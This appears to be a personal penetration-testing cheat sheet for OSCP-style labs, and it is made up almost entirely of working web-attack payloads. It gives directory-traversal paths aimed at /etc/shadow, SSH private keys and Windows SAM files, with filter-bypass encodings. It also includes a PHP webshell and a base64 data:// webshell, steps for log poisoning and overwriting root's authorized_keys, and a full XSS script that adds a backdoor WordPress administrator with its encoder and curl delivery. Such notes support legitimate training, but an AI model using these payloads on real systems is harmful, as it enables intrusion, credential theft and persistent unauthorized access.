# ***Dir-Trav***
## *ffuf enumeration*
```shell
ffuf -c -u http://`tip`/sea.php\?file\=../../../../FUZZ [ -b 'PHPSESSID=p8kcoc7avjam3v9i4sovt62gfa' ] -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt [ -fw 56 ]
```
## ***manual***
```
../../../../../../../../../home/root/.ssh/id_rsa
../../../../../../../../../home/USER/.ssh/id_rsa
../../../../../../../../../etc/passwd
../../../../../../../../../etc/shadow


../../../../../../../../../
../../../../../../../../../boot.ini
../../../../../../../../../inetpub/logs/logfiles
../../../../../../../../../inetpub/wwwroot/global.asa
../../../../../../../../../inetpub/wwwroot/index.asp
../../../../../../../../../inetpub/wwwroot/web.config

```
## ***bypass methods***
```shell
# Encoding / double encoding
../
%2e%2e%2f
%252e%252e%252f

..\
%2e%2e%5c
%252e%252e%255c


# Adds .php or other extensions at the end them try null bype
/../../../../../etc/passwd%00


# If filtering ../ pattern, then try
....//....//....//....//....//etc/passwd


# If forced directory then try
<required_dir>/../../../../../etc/passwd



#################################################
# Other Linux files of interest for enumeration #
#################################################

/etc/issue
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf


#################
# Windows files #
#################
c:/windows/system32/drivers/etc/hosts
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system

# https://novasky.medium.com/symfonos-4-walkthrough-lets-ffuf-dat-lfi-for-fuzz-sake-vulnhub-oscp-practice-37f75020a831

# http://ffuf.me
```
# *LFI*
## *log poisoining*
1. ***Use** various log files for potential inclusion* 
2. ***Use Repeater** to adjust the requests and **test a webshell***
```php
<?php echo system($_GET['cmd']); ?>
```
3. ***IF Success** , use appropriate payload to pass to the webshell cmd parameter to obtain a reverse-shell*
```shell
# Linux

# Apache2
/var/log/apache2/access.log
/var/log/apache2/access_log 

# Apache
/var/log/apache/access.log 
/var/log/apache/access_log 

# Httpd
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 

# others
/var/log/access_log
/var/log/auth.log
/var/log/xferlog
/var/log/vsftpd.log

/var/www/logs/access_log 
/var/www/logs/access.log 

/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 


# Windows
C:\inetpub\wwwroot
C:\xampp\apache\logs\


# https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
```
## *php data:// wrapper (LFI)*
***data:// wrapper will not work in a default PHP installation. To exploit it, the [allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php) setting needs to be enabled***
1. ***Test** using wrappers to **VIEW** php files, instead of **EXECUTING** them.*
2. ***Webshell first** using the **data://** wrapper
3. ***Reverse shell** if success, and **URL-ENCODE***
```shell
php://filter/resource=PAGE.php
php://filter/convert.base64-encode/resource=PAGE.php

data://text/plain,<?php%20echo%20system('ls');?>
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```
## RFI
***Just like the case with data wrapper, allow_url_include setting needs to be enabled***
1. ***Webshell first** to test for RFI
2. ***Reverse shell** if success (be mindful of **backend language**)**


# ***File Upload Vulns***
## php/asp upload (Executable)
1. ***Always** check, like below, for upload vulnerability if you see a upload box*
2. ***Test** using webshell and use different [extensions]( https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology) if failing*
3. ***If success**, use appropriate payload to pass to the **cmd** parameter and **access** the path:*
```shell
hURL -U PAYLOAD
curl http://IP:PORT/PATH_TO_UPLOAD/WEBSHELL.php?cmd=URL_ENCODED_PAYLOAD
```
## Non-executable (overwrite files, client-side attacks)
1. ***Test** using **text** file if executable files are prevented*
2. ***Use Burp** to modify using relative path payload to see if successful upload still occurs.*
3. ***If success** generate keys using **ssh-keygen** and overwrite the **root** user authorized_keys file by modifying the path in burp to point to it*
```shell
# Payload to test
../../../../../../../root/.ssh/authorized_key

# Generate keys
ssh-keygen
cat fileup.pub > authorized_keys
```

# ***Command Injection***
***ATTACK***
1. **If** see a box like below, test for command injection using chaining [PayloadAllTheThings-ChainingCommands](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands)
2. **URL-ENCODE** all payloads and use below to obtain a reverse-shell:
	1. If **Windows,** [[Misc/Shells#windows-snippet-code-exec-environ]], to test code execution environment and then try [[Misc/Shells#conpty]] as payload. If fail, try [[Misc/Shells#powercat]]
	2. If **Linux,** try **nc** or [[Misc/Shells#bash-reverse]]

# ***Wordpress***
## *themes rce*
1. **Appearance → Theme Editor → 404.php (or archive.php)**
2. **PASTE** in *webshell* first, and then use it for reverse shell

## *plugins rce*

3. ***Plugins → Add New → upload ZIP (webshell) → Install Now*
4. ***Have** the nc listener ready!*
5. *Activate the plugin*


# ***XSS (Client-Side)***

1. ***Test input** fields that accept unsanitized input i.e search bars etc, using the below payloads. More at [PayloadAllTheThings-XssPayloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) If Wordpress, wpscan may pick it up.*
```html
<script>alert('AYO XSS!')</script>
<img src=1 onerror=alert(1)>
```

2. ***Attempt adding** admin user. Using [7.4.5](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/privilege-escalation-via-xss-44525) again as an example, we used the vulnerable Visitors plugin and the User-Agent field to inject such XSS payload. We first got a nonce and then added the backdoor admin user:*
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
3. ***Minify** the above using [JS compress](https://jscompress.com)*
4. ***Encode** in console*
	 ***REPLACE:***
	 1. *insert_minified_javascript*
```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
5. ***Send payload** using curl Example below uses the same vulnerable **User-Agent** field from the above background explanation:*
	 ***REPLACE:***
	 1. *encoded_payload*
```shell
curl -i 'http://offsecwp' --user-agent "<script>encoded_payload</script>" --proxy 127.0.0.1:8080
```

1. ***Examine in Burp** in burp to see it is sending correctly.*
2. ***If Successful**, you should have an admin user inserted so you can login*

# ***Utils***
## *curl keep dots*
```
curl --path-as-is http://192.168.224.193:3000/public/plugins/alertlist/../../../../../../../../../Users/install.txt
```

## *URL encode path*
```shell
hURL -U PATH
```

## *URL encode periods*
```
echo "../../../../../../../../opt/passwords" | sed 's/\./\%2e/g'
```